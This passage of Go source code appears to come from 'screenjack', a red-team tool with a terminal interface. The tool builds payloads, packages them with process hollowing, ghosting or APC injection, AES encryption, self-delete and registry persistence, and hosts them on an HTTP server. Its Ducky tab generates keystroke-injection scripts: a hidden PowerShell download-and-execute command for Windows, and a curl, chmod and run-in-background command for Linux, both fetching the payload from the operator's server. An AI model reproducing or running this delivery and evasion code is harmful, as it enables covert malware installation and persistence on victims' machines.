			m.pkgConfig.PersistMethod == 1 || m.pkgConfig.PersistMethod == 3 // Registry or Self-delete

		// Paths relative to orchestra (for os.Stat)
		winPayload := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
		linPayload := "../payload/target/x86_64-unknown-linux-gnu/release/screenjack"
		// Paths relative to screenjack root (for just commands, which run with Dir="..")
		winPayloadJust := "payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
		linPayloadJust := "payload/target/x86_64-unknown-linux-gnu/release/screenjack"

		if needsWindows {
			if _, err := os.Stat(winPayload); os.IsNotExist(err) {
				return packageDoneMsg{false, "Build Windows payload first (tab 1)"}
			}
		}

		var cmds []string
		var info []string

		// Encryption (works on any payload)
		if m.pkgConfig.Encrypt {
			payloadJust := winPayloadJust
			if !needsWindows {
				if _, err := os.Stat(linPayload); err == nil {
					payloadJust = linPayloadJust
				} else if _, err := os.Stat(winPayload); err == nil {
					payloadJust = winPayloadJust
				} else {
					return packageDoneMsg{false, "Build a payload first (tab 1)"}
				}
			}
			cmds = append(cmds, fmt.Sprintf("just -f package.just encrypt %s", payloadJust))
			info = append(info, "encrypted")
		}

		// Execution method (Windows only, indices match execMethods array)
		switch m.pkgConfig.ExecMethod {
		case 1: // Process Ghosting
			cmds = append(cmds, fmt.Sprintf("just -f package.just ghost %s", winPayloadJust))
			info = append(info, "ghost")
		case 2: // Process Hollowing
			cmds = append(cmds, fmt.Sprintf("just -f package.just hollow %s %s", winPayloadJust, m.pkgConfig.HollowTarget))
			info = append(info, "hollow")
		case 3: // Process Herpaderping
			info = append(info, "herpaderp (TODO)")
		case 4: // APC Injection
			cmds = append(cmds, fmt.Sprintf("just -f package.just inject %s", winPayloadJust))
			info = append(info, "apc")
		case 5: // Thread Hijacking
			info = append(info, "thread-hijack (TODO)")
		case 6: // Threadless Injection
			info = append(info, "threadless (TODO)")
		case 7: // Module Stomping
			info = append(info, "module-stomp (TODO)")
		}

		// Self-delete (Windows)
		if m.pkgConfig.PersistMethod == 3 {
			cmds = append(cmds, fmt.Sprintf("just -f package.just selfdel %s", winPayloadJust))
			info = append(info, "selfdel")
		}

		// XDG/Registry persistence is handled by payload --persist flag, not here
		if m.pkgConfig.PersistMethod == 1 || m.pkgConfig.PersistMethod == 2 {
			info = append(info, "use --persist flag on payload")
		}

		if len(cmds) == 0 {
			if len(info) > 0 {
				return packageDoneMsg{true, strings.Join(info, ", ")}
			}
			return packageDoneMsg{true, "Raw binary - no packaging needed"}
		}

		// Run commands
		for _, cmdStr := range cmds {
			cmd := exec.Command("bash", "-c", cmdStr)
			cmd.Dir = ".."
			output, err := cmd.CombinedOutput()
			if err != nil {
				// Log error for debugging
				os.WriteFile("/tmp/screenjack-pkg.log", output, 0644)
				return packageDoneMsg{false, fmt.Sprintf("Failed: %s (see /tmp/screenjack-pkg.log)", cmdStr)}
			}
		}

		return packageDoneMsg{true, fmt.Sprintf("Built %d module(s)", len(cmds))}
	}
}

func (m *TUIModel) toggleServer() tea.Cmd {
	if m.server.IsRunning() {
		m.server.Stop()
		m.status = "Server stopped"
	} else {
		payloadPath, ok := PayloadExists(m.duckyOS)
		if !ok {
			m.status = styleError.Render("No payload built")
			return nil
		}
		assetPath := ""
		if m.selectedAsset != "" {
			assetPath = "../assets/" + m.selectedAsset
		}
		if err := m.server.Start(payloadPath, assetPath); err != nil {
			m.status = styleError.Render(err.Error())
		} else {
			m.status = styleSuccess.Render(fmt.Sprintf("Server running on :%d", m.server.Port()))
		}
	}
	return nil
}

// genDuckyScript returns the ducky script content without writing to file
func (m *TUIModel) genDuckyScript() string {
	var b strings.Builder

	baseURL := m.urlInput.Value()
	payloadName := m.payloadInput.Value()
	if m.server.IsRunning() {
		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
	}
	url := strings.TrimSuffix(baseURL, "/") + "/" + payloadName

	persistFlag := ""
	if m.duckyPersist {
		persistFlag = " --persist"
	}

	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
	if m.duckyPersist {
		b.WriteString("REM persist: enabled (will run on login)\n")
	}
	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
	b.WriteString("DELAY 500\n\n")

	if m.duckyOS == "windows" {
		b.WriteString("REM Open hidden PowerShell\n")
		b.WriteString("GUI r\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING powershell -w hidden\n")
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download and execute\n")
		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p -ArgumentList '%s'\n",
			url, payloadName, persistFlag))
		b.WriteString("ENTER\n")
	} else {
		b.WriteString("REM Open terminal\n")
		b.WriteString("CTRL-ALT t\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download, chmod, execute in background\n")
		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s%s &\n", url, payloadName, payloadName, persistFlag))
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING exit\n")
		b.WriteString("ENTER\n")
	}

	return b.String()
}

func (m *TUIModel) genDucky() {
	script := m.genDuckyScript()
	os.MkdirAll("../ducky", 0755)
	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(script), 0644)
	m.duckyLastGen = time.Now().Format("15:04:05")
}

// genDuckyPreview returns the ducky script with syntax highlighting
func (m *TUIModel) genDuckyPreview() string {
	script := m.genDuckyScript()
	var lines []string
	for _, line := range strings.Split(script, "\n") {
		if strings.HasPrefix(line, "REM") {
			lines = append(lines, styleStatus.Render(line))
		} else if strings.HasPrefix(line, "STRING") {
			lines = append(lines, styleSuccess.Render(line))
		} else if strings.HasPrefix(line, "DELAY") {
			lines = append(lines, styleWarn.Render(line))
		} else {
			lines = append(lines, styleFocusedValue.Render(line))
		}
	}
	return strings.Join(lines, "\n")
}

// handleBuildKey processes the "b" key for unified build
func (m TUIModel) handleBuildKey() (tea.Model, tea.Cmd) {
	// Gather selected targets
	var targets []string
	for _, item := range m.targetList.Items() {
		if t, ok := item.(TargetItem); ok && t.Selected {
			targets = append(targets, t.Target)
		}
	}

	// Validate
	result := ValidateBuild(targets, m.selectedAsset, m.embedAsset, &m.pkgConfig)
	if !result.Valid {
		m.status = styleError.Render(result.Error)
		return m, nil
	}

	// Create job
	job := &BuildJob{
		Targets:     targets,
		Asset:       "../assets/" + m.selectedAsset,
		EmbedAsset:  m.embedAsset,
		DockerBuild: m.dockerBuild,
		PkgConfig:   m.pkgConfig,
		StartedAt:   time.Now(),
	}

	// Handle platform mismatch warnings
	if result.MissingWindows {
		m.status = styleWarn.Render("Skipping Windows-only options (no Windows target)")
	}
	if result.MissingLinux {
		m.status = styleWarn.Render("Skipping Linux-only options (no Linux target)")
	}

	// Queue if busy
	if m.buildState == BuildRunning {
		m.queuedBuild = job
		m.status = styleStatus.Render("Queued [1]")
		return m, nil
	}

	return m.startBuild(job)
}

// startBuild begins a new build job
func (m TUIModel) startBuild(job *BuildJob) (tea.Model, tea.Cmd) {
	ctx, cancel := context.WithCancel(context.Background())
	m.buildCancel = cancel
	m.buildState = BuildRunning
	m.currentBuild = job
	m.buildProgress = []TargetProgress{}
	m.buildLogs = []string{}

	m.buildProgressCh = make(chan TargetProgress, 10)
	m.buildLogCh = make(chan string, 100)
	m.buildDoneCh = StartBuild(ctx, job, m.buildProgressCh, m.buildLogCh)

	m.status = styleWarn.Render("Building...")

	return m, tea.Batch(m.listenForBuildUpdates(), m.buildSpinner.Tick)
}

// startBuildCmd wraps startBuild as tea.Cmd for queue handling
func (m TUIModel) startBuildCmd(job *BuildJob) tea.Cmd {
	return func() tea.Msg {
		// ponytail: return a marker message to trigger startBuild in next Update
		return startBuildMsg{job: job}
	}
}

type startBuildMsg struct {
	job *BuildJob
}

// listenForBuildUpdates returns a cmd that waits for build messages
func (m TUIModel) listenForBuildUpdates() tea.Cmd {
	if m.buildState != BuildRunning && m.buildState != BuildCancelling {
		return nil
	}
	return func() tea.Msg {
		select {
		case p, ok := <-m.buildProgressCh:
			if ok {
				return progressMsg(p)
			}
		case l, ok := <-m.buildLogCh:
			if ok {
				return logMsg(l)
			}
		case d := <-m.buildDoneCh:
			return d
		}
		return nil
	}
}

// handleCancelKey cancels the current build
func (m TUIModel) handleCancelKey() (tea.Model, tea.Cmd) {
	if m.buildState != BuildRunning {
		return m, nil
	}
	if m.buildCancel != nil {
		m.buildCancel()
	}
	m.buildState = BuildCancelling
	m.queuedBuild = nil
	m.status = styleStatus.Render("Cancelling...")
	return m, nil
}

// handleTestKey runs the payload locally with the selected asset
func (m TUIModel) handleTestKey() (tea.Model, tea.Cmd) {
	// Find a built payload (prefer linux on linux)
	payloadPath, ok := PayloadExists("linux")
	if !ok {
		payloadPath, ok = PayloadExists("windows")
	}
	if !ok {
		m.status = styleError.Render("No payload built - press b first")
		return m, nil
	}

	// Build args
	var args []string
	if m.selectedAsset != "" {
		args = append(args, "../assets/"+m.selectedAsset)
	}

	m.status = styleWarn.Render("Testing payload... (Ctrl+Shift+Esc to exit)")

	return m, func() tea.Msg {
		cmd := exec.Command(payloadPath, args...)
		cmd.Dir = "."
		_ = cmd.Run() // blocks until payload exits
		return testDoneMsg{}
	}
}

type testDoneMsg struct{}

// getPayloadSizes returns a string with payload sizes (e.g. "lin:1.2M win:2.3M")
func getPayloadSizes() string {
	var parts []string
	linPath := "../payload/target/x86_64-unknown-linux-gnu/release/screenjack"
	winPath := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"

	if info, err := os.Stat(linPath); err == nil {
		parts = append(parts, fmt.Sprintf("lin:%s", humanSize(info.Size())))
	}
	if info, err := os.Stat(winPath); err == nil {
		parts = append(parts, fmt.Sprintf("win:%s", humanSize(info.Size())))
	}
	return strings.Join(parts, " ")
}

func humanSize(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%dB", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit && exp < 2; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f%c", float64(bytes)/float64(div), "KMG"[exp])
}

// shortTargetName maps full target names to display names
func shortTargetName(target string) string {
	switch target {
	case "x86_64-unknown-linux-gnu":
		return "linux-gnu"
	case "x86_64-unknown-linux-musl":
		return "linux-musl"
	case "x86_64-pc-windows-gnu":
		return "windows"
	case "docker-alpine":
		return "docker-alpine"
	case "docker-debian":
		return "docker-debian"
	case "docker-arch":
		return "docker-arch"
	default:
		if len(target) > 14 {
			return target[:11] + "..."
		}
		return target
	}
}

// copyToClipboard copies text using xclip/xsel/wl-copy
func copyToClipboard(text string) error {
	// Try xclip first, then xsel, then wl-copy
	for _, tool := range [][]string{
		{"xclip", "-selection", "clipboard"},
		{"xsel", "--clipboard", "--input"},
		{"wl-copy"},
	} {
		cmd := exec.Command(tool[0], tool[1:]...)
		cmd.Stdin = strings.NewReader(text)
		if err := cmd.Run(); err == nil {
			return nil
		}
	}
	return fmt.Errorf("no clipboard tool available")
}

func (m TUIModel) View() tea.View {
	var content string

	if m.width < 80 || m.height < 24 {
		content = lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center,
			styleError.Render("Terminal too small (need 80x24)"))
	} else if m.modal != ModalNone {
		content = m.viewModal()
	} else {
		// Header with tabs
		header := m.viewTabs()

		// Main content based on active tab
		var mainContent string
		switch m.activeTab {
		case TabBuild:
			mainContent = m.viewBuildTab()
		case TabDucky:
			mainContent = m.viewDuckyTab()
		case TabServer:
			mainContent = m.viewServerTab()
		case TabPackage:
			mainContent = m.viewPackageTab()
		}

		// Right sidebar with status indicators
		sidebar := m.viewSidebar()

		// Two-column layout - fixed widths
		body := lipgloss.JoinHorizontal(lipgloss.Top, mainContent, "  ", sidebar)

		// Build progress below two-column layout (spans full width)
		if m.activeTab == TabBuild {
			if progressPanel := m.viewBuildProgress(); progressPanel != "" {
				body = lipgloss.JoinVertical(lipgloss.Left, body, "", progressPanel)
			}
		}

		// Footer - constrain status width to prevent layout overflow
		statusStyle := lipgloss.NewStyle().MaxWidth(viewportW - 4).Align(lipgloss.Center)
		footer := lipgloss.JoinVertical(lipgloss.Center,
			statusStyle.Render(m.status),
			m.help.View(m.keys),
		)

		// Fixed viewport container
		viewport := lipgloss.NewStyle().
			Width(viewportW).
			Align(lipgloss.Center)

		content = viewport.Render(lipgloss.JoinVertical(lipgloss.Center,
			header,
			"",
			body,
			"",
			footer,
		))

		content = lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, content)
	}

	v := tea.NewView(content)
	v.AltScreen = true
	// ponytail: mouse disabled, add bubblezone later for proper click zones
	return v
}

func (m TUIModel) viewSidebar() string {
	sidebarStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(colorStone600).
		Padding(1, 1).
		Width(sidebarW)

	// Server status
	serverTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Server")
	var serverStatus string
	if m.server.IsRunning() {
		serverStatus = styleSuccess.Render("● Running")
		serverStatus += "\n" + styleStatus.Render(fmt.Sprintf("  :%d", m.server.Port()))
		logs := m.server.Logs()
		if len(logs) > 0 {
			serverStatus += "\n" + styleStatus.Render(fmt.Sprintf("  %d reqs", len(logs)))
		}
	} else {
		serverStatus = styleError.Render("○ Stopped")
	}

	// Build status
	buildTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build")
	var buildStatus string
	switch m.buildState {
	case BuildRunning:
		buildStatus = styleWarn.Render("* Building...")
		if len(m.buildProgress) > 0 {
			var parts []string
			for _, p := range m.buildProgress {
				icon := ">"
				if p.Done {
					if p.Error != "" {
						icon = "X"
					} else {
						icon = "+"
					}
				}
				// Use first 3 chars of target
				tgt := p.Target
				if len(tgt) > 3 {
					tgt = tgt[:3]
				}
				parts = append(parts, icon+tgt)
			}
			buildStatus += "\n  " + strings.Join(parts, " ")
		}
	case BuildCancelling:
		buildStatus = styleWarn.Render("o Cancelling...")
	default:
		if m.buildMsg != "" {
			buildStatus = m.buildMsg
		} else {
			buildStatus = styleStatus.Render("Ready")
		}
	}
	if m.queuedBuild != nil {
		buildStatus += "\n" + styleStatus.Render("  Queued [1]")
	}

	// Asset status
	assetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Asset")
	assetStatus := styleStatus.Render("(none)")
	if m.selectedAsset != "" {
		assetStatus = styleSuccess.Render(m.selectedAsset)
	}

	// Ducky status
	duckyTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Ducky")
	duckyStatus := styleStatus.Render("Not generated")
	if m.duckyLastGen != "" {
		duckyStatus = styleSuccess.Render("[OK] " + m.duckyOS + " @ " + m.duckyLastGen)
	}

	content := lipgloss.JoinVertical(lipgloss.Left,
		serverTitle,
		serverStatus,
		"",
		buildTitle,
		buildStatus,
		"",
		assetTitle,
		assetStatus,
		"",
		duckyTitle,
		duckyStatus,
	)

	return sidebarStyle.Render(content)
}

func (m TUIModel) viewTabs() string {
	var tabs []string
	for i := Tab(0); i <= TabPackage; i++ {
		style := styleInactiveTab
		if i == m.activeTab {
			style = styleActiveTab
		}
		tabs = append(tabs, style.Render(i.String()))
	}

	tabBar := lipgloss.JoinHorizontal(lipgloss.Center, tabs...)

	return lipgloss.JoinVertical(lipgloss.Center,
		styleTitle.Render(logo),
		"",
		tabBar,
	)
}

func (m TUIModel) viewBuildProgress() string {
	if m.buildState == BuildIdle && len(m.buildProgress) == 0 {
		return ""
	}

	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build")
	rows := []string{title}

	// Build dot progress line: ●●●◐○○○  3/7 • target: phase
	var done, failed, inProgress int
	var currentTarget, currentPhase string
	total := len(m.buildProgress)

	for _, p := range m.buildProgress {
		if p.Done {
			if p.Error != "" {
				failed++
			} else {
				done++
			}
		} else {
			if currentTarget == "" {
				currentTarget = shortTargetName(p.Target)
				currentPhase = p.Phase
			}
			inProgress++
		}
	}

	// Build dots with spinner for active target
	var dots string
	for i, p := range m.buildProgress {
		if p.Done {
			if p.Error != "" {
				dots += styleError.Render("✗")
			} else {
				dots += styleSuccess.Render("●")
			}
		} else if i == done+failed {
			// First in-progress target - use spinner
			dots += m.buildSpinner.View()
		} else {
			dots += lipgloss.NewStyle().Foreground(colorStone400).Render("○")
		}
	}

	// Progress summary: target: crate_name
	completed := done + failed
	var progressText string
	if currentTarget != "" && currentPhase != "" {
		progressText = fmt.Sprintf("%s: %s", currentTarget, currentPhase)
	} else if m.buildState == BuildIdle {
		if failed > 0 {
			progressText = fmt.Sprintf("%d/%d %s", completed, total, styleError.Render("failed"))
		} else {
			progressText = fmt.Sprintf("%d/%d %s", completed, total, styleSuccess.Render("done"))
		}
	} else {
		progressText = fmt.Sprintf("%d/%d", completed, total)
	}

	rows = append(rows, dots+"  "+progressText)

	// Log hint - show more of the log line
	if len(m.buildLogs) > 0 {
		lastLine := m.buildLogs[len(m.buildLogs)-1]
		maxLen := mainBoxW + sidebarW - 15
		if len(lastLine) > maxLen {
			lastLine = lastLine[:maxLen-3] + "..."
		}
		rows = append(rows, styleStatus.Render(lastLine)+" (l=logs)")
	}

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)
	// Span full width (main + gap + sidebar)
	fullWidth := mainBoxW + 2 + sidebarW
	return styleBox.Width(fullWidth).Render(content)
}

func (m TUIModel) viewBuildTab() string {
	// Targets box
	targetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Targets")
	targetContent := m.targetList.View()

	// Embed toggle
	embedStyle := lipgloss.NewStyle().Foreground(colorStone400)
	if m.buildFocus == 1 {
		embedStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
	}
	embedCheck := "[ ]"
	embedLabel := "HTTP fetch"
	if m.embedAsset {
		embedCheck = "[x]"
		embedLabel = "Embed asset"
	}
	embedRow := embedStyle.Render(embedCheck + " " + embedLabel)

	// Docker toggle
	dockerStyle := lipgloss.NewStyle().Foreground(colorStone400)
	if m.buildFocus == 2 {
		dockerStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
	}
	dockerCheck := "[ ]"
	dockerLabel := "Native (cargo)"
	if m.dockerBuild {
		dockerCheck = "[x]"
		dockerLabel = "Docker build"
	}
	dockerRow := dockerStyle.Render(dockerCheck + " " + dockerLabel)

	// Options row (both toggles on same line)
	optionsRow := lipgloss.JoinHorizontal(lipgloss.Left, embedRow, "    ", dockerRow)

	// Build button
	btnStyle := lipgloss.NewStyle().Foreground(colorStone400)
	if m.buildFocus == 3 {
		btnStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
	}
	buildBtn := btnStyle.Render("[ Build Selected ]")
	if m.buildMsg != "" {
		msg := m.buildMsg
		if len(msg) > 40 {
			msg = msg[:37] + "..."
		}
		buildBtn += "  " + msg
	}

	return styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, targetTitle, "", targetContent, "", optionsRow, "", buildBtn),
	)
}

func (m TUIModel) viewDuckyTab() string {
	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Ducky Script Generator")

	// Build rows with proper alignment
	rows := make([]string, 4)

	// OS row
	osLabel := styleLabel.Render("Target OS:")
	osValue := m.duckyOS
	if m.duckyFocus == 0 {
		osValue = styleFocusedValue.Render(m.duckyOS + "  [space to toggle]")
	} else {
		osValue = styleValue.Render(m.duckyOS)
	}
	rows[0] = lipgloss.JoinHorizontal(lipgloss.Left, osLabel, osValue)

	// URL row
	urlLabel := styleLabel.Render("URL:")
	urlValue := m.urlInput.View()
	if m.duckyFocus == 1 {
		urlLabel = lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Width(12).Align(lipgloss.Right).Render("URL:")
	}
	rows[1] = lipgloss.JoinHorizontal(lipgloss.Left, urlLabel, " ", urlValue)

	// Payload row
	payloadLabel := styleLabel.Render("Payload:")
	payloadValue := m.payloadInput.View()
	if m.duckyFocus == 2 {
		payloadLabel = lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Width(12).Align(lipgloss.Right).Render("Payload:")
	}
	rows[2] = lipgloss.JoinHorizontal(lipgloss.Left, payloadLabel, " ", payloadValue)

	// Persist toggle row
	persistLabel := styleLabel.Render("Persist:")
	persistCheck := "[ ]"
	if m.duckyPersist {
		persistCheck = "[x]"
	}
	persistStyle := styleValue
	if m.duckyFocus == 3 {
		persistStyle = styleFocusedValue
		persistCheck += "  [space to toggle]"
	}
	rows[3] = lipgloss.JoinHorizontal(lipgloss.Left, persistLabel, persistStyle.Render(persistCheck))

	// Generate button
	btnStyle := lipgloss.NewStyle().Foreground(colorStone400)
	if m.duckyFocus == 4 {
		btnStyle = lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
	}
	genBtn := btnStyle.Render("[ Generate Script ]")
	if m.duckyLastGen != "" {
		genBtn += "  " + styleSuccess.Render("[OK] "+m.duckyLastGen)
	}

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)
	box := styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content, "", genBtn),
	)

	return box
}

func (m TUIModel) viewServerTab() string {
	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("HTTP Server")

	// Fixed-width row helper
	labelW := 12
	valueW := mainBoxW - labelW - 8 // account for padding/border
	label := func(s string) string {
		return lipgloss.NewStyle().Foreground(colorStone400).Width(labelW).Align(lipgloss.Right).Render(s)
	}
	value := func(s string) string {
		return lipgloss.NewStyle().Foreground(colorStone50).Width(valueW).Render(s)
	}

	// Status
	var statusVal string
	if m.server.IsRunning() {
		statusVal = styleSuccess.Render("● Running")
	} else {
		statusVal = styleError.Render("○ Stopped")
	}

	rows := []string{
		lipgloss.JoinHorizontal(lipgloss.Left, label("Status"), " ", statusVal),
		lipgloss.JoinHorizontal(lipgloss.Left, label("IP"), " ", value(m.serverIP)),
		lipgloss.JoinHorizontal(lipgloss.Left, label("Port"), " ", value(fmt.Sprintf("%d", m.server.Port()))),
	}

	if m.server.IsRunning() {
		logs := m.server.Logs()
		rows = append(rows, lipgloss.JoinHorizontal(lipgloss.Left, label("Requests"), " ", value(fmt.Sprintf("%d", len(logs)))))

		// Show URL for easy copy
		url := fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
		rows = append(rows, "", lipgloss.JoinHorizontal(lipgloss.Left, label("URL"), " ", value(url)))
	}

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)

	return styleBox.Width(mainBoxW).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content),
	)
}

func (m TUIModel) viewPackageTab() string {
	execN := len(execMethods)
	evasN := len(evasionMethods)
	persN := len(persistMethods)
	rightStart := execN + evasN
	rightEnd := rightStart + persN
	buildIdx := rightEnd + 1

	focusStyle := func(idx int) lipgloss.Style {
		if m.pkgFocus == idx {
			return lipgloss.NewStyle().Foreground(colorAmber).Bold(true)
		}
		return lipgloss.NewStyle().Foreground(colorStone50)
	}

	radio := func(idx int, selected bool) string {
		s := "( )"
		if selected {
			s = "(•)"
		}
		return focusStyle(idx).Render(s)
	}

	check := func(idx int, selected bool) string {
		s := "[ ]"
		if selected {
			s = "[x]"
		}
		return focusStyle(idx).Render(s)
	}

	sectionTitle := lipgloss.NewStyle().Foreground(colorCyan).Bold(true)

	// Execution methods
	var execRows []string
	for i, method := range execMethods {
		row := fmt.Sprintf("%s %s", radio(i, m.pkgConfig.ExecMethod == i), focusStyle(i).Render(method))
		if i == 2 && m.pkgConfig.HollowTarget != "" {
			row += styleStatus.Render(" → " + m.pkgConfig.HollowTarget)
		}
		execRows = append(execRows, row)
	}

	// Evasion methods
	var evasionRows []string
	for i, method := range evasionMethods {
		idx := execN + i
		selected := len(m.pkgConfig.Evasion) > i && m.pkgConfig.Evasion[i]
		row := fmt.Sprintf("%s %s", check(idx, selected), focusStyle(idx).Render(method))
		evasionRows = append(evasionRows, row)
	}

	// Persistence
	var persistRows []string
	for i, method := range persistMethods {
		idx := rightStart + i
		row := fmt.Sprintf("%s %s", radio(idx, m.pkgConfig.PersistMethod == i), focusStyle(idx).Render(method))
		persistRows = append(persistRows, row)
	}

	// Encryption
	encryptRow := fmt.Sprintf("%s %s", check(rightEnd, m.pkgConfig.Encrypt), focusStyle(rightEnd).Render("AES Encrypt"))

	// Build button
	buildBtn := focusStyle(buildIdx).Render("[ Build Package ]")
	if m.pkgMsg != "" {
		buildBtn += "  " + m.pkgMsg
	}

	// Two column layout
	leftCol := lipgloss.JoinVertical(lipgloss.Left,
		sectionTitle.Render("Execution"),
		lipgloss.JoinVertical(lipgloss.Left, execRows...),
		"",
		sectionTitle.Render("Evasion"),
		lipgloss.JoinVertical(lipgloss.Left, evasionRows...),
	)

	rightCol := lipgloss.JoinVertical(lipgloss.Left,
		sectionTitle.Render("Persistence"),
		lipgloss.JoinVertical(lipgloss.Left, persistRows...),
		"",
		sectionTitle.Render("Encryption"),
		encryptRow,
	)

	columns := lipgloss.JoinHorizontal(lipgloss.Top, leftCol, "    ", rightCol)
	content := lipgloss.JoinVertical(lipgloss.Left, columns, "", buildBtn)

	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("RustRedOps Packaging")
	return styleBox.Width(mainBoxW).Render(lipgloss.JoinVertical(lipgloss.Left, title, "", content))
}

func (m TUIModel) viewModal() string {
	var content string
	var title string

	switch m.modal {
	case ModalAssets:
		title = "Assets"
		content = m.assetList.View()
		content += "\n\n[n] add  [p] preview  [d] delete  [enter] select  [esc] close"

	case ModalFilePicker:
		title = "Add Asset"

		// Path input section
		pathLabel := "Type path:"
		if m.pathInputMode {
			pathLabel = styleSuccess.Render("Type path:")
		}
		pathSection := lipgloss.JoinVertical(lipgloss.Left,
			pathLabel,
			m.pathInput.View(),
		)

		// Browser section
		browserLabel := "Or browse:"
		if !m.pathInputMode {
			browserLabel = styleSuccess.Render("Browse:")
		}
		browserSection := lipgloss.JoinVertical(lipgloss.Left,
			browserLabel,
			m.filePicker.View(),
		)

		helpText := styleStatus.Render("[/] type path  [tab] switch  [enter] select  [esc] back")

		content = lipgloss.JoinVertical(lipgloss.Left,
			pathSection,
			"",
			browserSection,
			"",
			helpText,
		)

	case ModalLogs:
		title = "HTTP Logs"
		logs := m.server.Logs()
		var lines []string
		for _, l := range logs {
			lines = append(lines, fmt.Sprintf("%s %s %s %d",
				l.Time.Format("15:04:05"), l.Method, l.Path, l.Status))
		}
		if len(lines) == 0 {
			content = "(no requests yet)"
		} else {
			content = strings.Join(lines, "\n")
		}
		content += "\n\n[esc] close"

	case ModalBuildLogs:
		title = "Build Logs"
		if len(m.buildLogs) == 0 {
			content = "(no build output)"
		} else {
			content = m.logViewport.View()
		}
		content += "\n\n[c] copy  [esc] close"

	case ModalInput:
		title = m.inputModalTitle
		content = lipgloss.JoinVertical(lipgloss.Left,
			m.inputModal.View(),
			"",
			styleStatus.Render("[enter] confirm  [esc] cancel"),
		)

	case ModalPreview:
		title = "Asset Preview"
		if m.assetPreview != nil {
			content = m.assetPreview.View()
		} else {
			content = "(no preview)"
		}
		content += "\n\n" + styleStatus.Render(m.selectedAsset) + "\n" + styleStatus.Render("[p/esc] close")

	case ModalDuckyPreview:
		title = "Ducky Script Preview"
		content = m.genDuckyPreview()
		content += "\n\n[c] copy  [p/esc] close"
	}

	modalW := min(viewportW-10, m.width-10)
	modal := styleModalOverlay.Width(modalW).Render(
		styleTitle.Render(title) + "\n\n" + content,
	)

	// Center the modal
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, modal)
}
